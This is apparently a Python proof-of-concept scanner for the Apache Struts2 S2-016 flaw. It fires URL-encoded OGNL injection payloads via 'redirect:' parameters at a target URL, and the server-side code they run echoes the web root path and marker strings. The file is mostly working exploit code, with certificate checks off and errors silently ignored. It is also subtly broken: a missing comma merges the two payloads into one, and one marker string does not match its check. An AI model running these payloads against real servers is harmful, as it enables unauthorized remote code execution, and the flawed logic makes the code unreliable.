import warnings
import requests

warnings.filterwarnings("ignore")


def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}
    check = ['\Struts2-vlun-Goop', '/Struts2-vlun-Goop', '-Struts2-vlun-Goop',
             'Unable to initialize device PRN']
    poc_goop = [
        r"redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22Struts2-vlun-Goop%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
        r"redirect%3a%24%7b%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.print%28%27-Struts2-vuln%27%2b%27-Goop%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29%7d"
        # r"redirect:http://www.gooip.club/"
    ]
    headers = {
        "Accept": "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        for test in poc_goop:
            req_get = requests.get(url + '?' + test, headers=headers, timeout=timeout, verify=False,
                                   allow_redirects=False,)
            req_post = requests.post(url, data=test, headers=headers, timeout=timeout, verify=False,
                                     allow_redirects=False,)
            req_list = [req_get.text, req_post.text, req_get.headers, req_post.headers]
            result = "目标存在 Struts2-016, check url: %s" % url
            for c in check:
                for text in req_list:
                    if str(c) in text:
                        return result
    except:
        pass
